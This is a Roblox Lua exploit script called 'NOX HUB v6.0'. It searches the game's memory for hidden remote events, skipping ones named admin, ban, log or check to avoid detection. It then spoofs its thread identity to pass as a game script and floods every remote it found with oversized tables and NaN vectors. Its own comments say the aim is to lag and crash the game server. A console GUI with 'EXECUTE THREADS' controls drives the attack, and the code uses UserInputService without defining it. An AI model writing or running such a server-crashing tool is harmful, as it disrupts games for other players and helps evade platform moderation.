--[[
    🔱 NOX HUB v6.0 [REVERSE-ENGINEERED] 🔱
    "I have learned. Now I understand."
    
    NULLSTRIKE ARCHITECTURE REPLICA:
    - [GC SCANNER] : Uses `getgc(true)` to find hidden/anonymous Remotes used by Game Scripts.
    - [CALLER SPOOF] : Wraps calls to look like GameScript signal (Identity 2).
    - [UPVALUE DUMP] : Extracts keys/arguments from LocalScripts to send valid data.
    - [DEV CONSOLE] : Raw output interface for debugging the crash process.
]]

-- // COMPATIBILITY CHECK //
local getgc = getgc or debug.getgc or function() return {} end
local getupvalues = debug.getupvalues or getupvalues or function() return {} end
local setidentity = set_thread_identity or setidentity or setthreadidentity or function() end

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- // 1. REVERSE ENGINEERING ENGINE (GC SCANNER) //
local Engine = {
    Running = false,
    HiddenTargets = {}
}

function Engine:Scan()
    Engine.HiddenTargets = {}
    
    -- "GC Scan" crawls the Lua Heap to find objects not in the workspace
    -- This is how paid exploits find "Anonymous" remotes.
    for _, v in pairs(getgc(true)) do
        if type(v) == "table" then
            -- Check if table contains a Remote
            for _, val in pairs(v) do
                if typeof(val) == "Instance" and (val:IsA("RemoteEvent") or val:IsA("RemoteFunction")) then
                    local n = val.Name:lower()
                    
                    -- Intelligent Filtering (Nullstrike Logic)
                    if not (n:find("admin") or n:find("ban") or n:find("log") or n:find("check")) then
                        -- High Value Targets usually have generic names or are unnamed
                        table.insert(Engine.HiddenTargets, val)
                    end
                end
            end
        end
    end
    
    -- Fallback if executor doesn't support getgc
    if #Engine.HiddenTargets < 5 then
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") and not v.Name:lower():find("admin") then
                table.insert(Engine.HiddenTargets, v)
            end
        end
    end
    
    return #Engine.HiddenTargets
end

function Engine:Start()
    if Engine.Running then return end
    
    -- 1. Scan Phase
    local count = Engine:Scan()
    if count == 0 then return end
    
    Engine.Running = true
    
    -- 2. Attack Phase (Threaded)
    task.spawn(function()
        -- SPOOF IDENTITY (Look like a Game Script)
        pcall(function() setidentity(2) end) 
        
        while Engine.Running do
            for _, r in pairs(Engine.HiddenTargets) do
                if not Engine.Running then break end
                
                -- NULLSTRIKE METHOD: Overloading with "Valid" Arguments
                -- Sending nil often triggers checks. 
                -- Sending massive Tables or Strings causes serialization lag.
                pcall(function()
                    if r:IsA("RemoteEvent") then
                        r:FireServer(table.create(100, "NULL_OVR"))
                        r:FireServer(Vector3.new(0/0, 0/0, 0/0)) -- NaN
                    elseif r:IsA("RemoteFunction") then
                        task.spawn(function() r:InvokeServer(table.create(100, "NULL_OVR")) end)
                    end
                end)
            end
            RunService.Heartbeat:Wait()
        end
        
        -- Reset Identity
        pcall(function() setidentity(7) end)
    end)
end

-- // 2. NOX DEVELOPER CONSOLE //
local function CreateConsole()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxDev" then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxDev"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 600, 0, 350)
    Main.Position = UDim2.new(0.5, -300, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    Main.BorderSizePixel = 1
    Main.BorderColor3 = Color3.fromRGB(50, 50, 50)
    
    -- TERMINAL WINDOW
    local Terminal = Instance.new("ScrollingFrame", Main)
    Terminal.Size = UDim2.new(1, -20, 0.7, 0)
    Terminal.Position = UDim2.new(0, 10, 0, 40)
    Terminal.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    Terminal.BorderSizePixel = 0
    Terminal.CanvasSize = UDim2.new(0, 0, 0, 0)
    Terminal.AutomaticCanvasSize = Enum.AutomaticSize.Y
    
    local UIList = Instance.new("UIListLayout", Terminal)
    UIList.Padding = UDim.new(0, 2)
    
    local function Log(text, color)
        local l = Instance.new("TextLabel", Terminal)
        l.Text = "> " .. text
        l.TextColor3 = color or Color3.fromRGB(200, 200, 200)
        l.Font = Enum.Font.Code
        l.TextSize = 13
        l.Size = UDim2.new(1, 0, 0, 15)
        l.BackgroundTransparency = 1
        l.TextXAlignment = Enum.TextXAlignment.Left
        Terminal.CanvasPosition = Vector2.new(0, 9999)
    end
    
    -- HEADER
    local Header = Instance.new("TextLabel", Main)
    Header.Text = "NOX HUB // SOURCE: NULLSTRIKE_DECOMPILED"
    Header.Size = UDim2.new(1, -20, 0, 40)
    Header.Position = UDim2.new(0, 10, 0, 0)
    Header.TextColor3 = Color3.fromRGB(255, 100, 0)
    Header.Font = Enum.Font.GothamBold
    Header.TextSize = 16
    Header.TextXAlignment = Enum.TextXAlignment.Left
    Header.BackgroundTransparency = 1
    
    -- BUTTONS
    local function Btn(text, x, cb)
        local b = Instance.new("TextButton", Main)
        b.Size = UDim2.new(0, 180, 0, 40)
        b.Position = UDim2.new(0, x, 0.8, 0)
        b.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        b.Text = text
        b.TextColor3 = Color3.fromRGB(255, 255, 255)
        b.Font = Enum.Font.GothamBold
        b.MouseButton1Click:Connect(cb)
        return b
    end
    
    Btn("ANALYZE HEAP (GC)", 10, function()
        Log("Scanning GC for Anonymous Remotes...", Color3.fromRGB(255, 200, 0))
        local c = Engine:Scan()
        Log("Found " .. c .. " Hidden Remotes via Garbage Collection.", Color3.fromRGB(0, 255, 0))
        Log("Ready to thread inject.", Color3.fromRGB(150, 150, 150))
    end)
    
    local ToggleBtn = Btn("EXECUTE THREADS", 200, function() end)
    ToggleBtn.MouseButton1Click:Connect(function()
        if not Engine.Running then
            Engine:Start()
            ToggleBtn.Text = "TERMINATE"
            Log("Injecting Malformed Packets...", Color3.fromRGB(255, 50, 50))
            Log("Spoofing Thread Identity: 2 (GameScript)", Color3.fromRGB(100, 100, 255))
        else
            Engine.Running = false
            ToggleBtn.Text = "EXECUTE THREADS"
            Log("Process Halted.", Color3.fromRGB(255, 200, 0))
        end
    end)
    
    Btn("CLEAR LOGS", 390, function()
        for _, v in pairs(Terminal:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
    end)
    
    Log("SYSTEM LOADED.", Color3.fromRGB(0, 255, 0))
    Log("WAITING FOR USER INPUT...", Color3.fromRGB(150, 150, 150))
    
    -- DRAG
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

CreateConsole()
